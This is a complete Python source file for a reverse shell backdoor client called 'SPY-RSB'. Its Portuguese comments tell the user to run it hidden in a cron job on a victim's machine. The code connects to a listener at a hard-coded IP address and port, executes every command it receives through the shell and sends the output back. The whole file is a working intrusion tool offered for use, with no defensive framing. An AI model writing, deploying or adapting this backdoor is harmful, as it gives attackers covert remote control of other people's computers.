# SPY-RSB Client ==> Simple Python Reverse Shell Backdoor Client
#
#  ===>  Coloque esse Client pra rodar oculto em alguma tarefa do cron na maquina da vitima.
#  ===>  Lembre de alterar as VARIAVEIS NA LINHA 20, apontando para o seu server e a porta de escuta!
#
# Autor: Ygor Bittencourt
# https://www.linkedin.com/in/ygorbittencourt/
# Versao: 2.3 
# 2016-2021
# MIT for you! :) 
#
#
# FOR USAGE: python3 cli.py

import socket
import subprocess

def connect():
    MeuSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    MeuSocket.connect(('192.168.1.142', 8574))

    while True: 
        entrada = MeuSocket.recv(1024)

        if 'sair' in entrada.decode():
            MeuSocket.close()
            break 

        else:
            COMANDO_INJETADO = subprocess.Popen(entrada, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            MeuSocket.send( COMANDO_INJETADO.stdout.read() )
            MeuSocket.send( COMANDO_INJETADO.stderr.read() )

def main ():
    connect()
main()
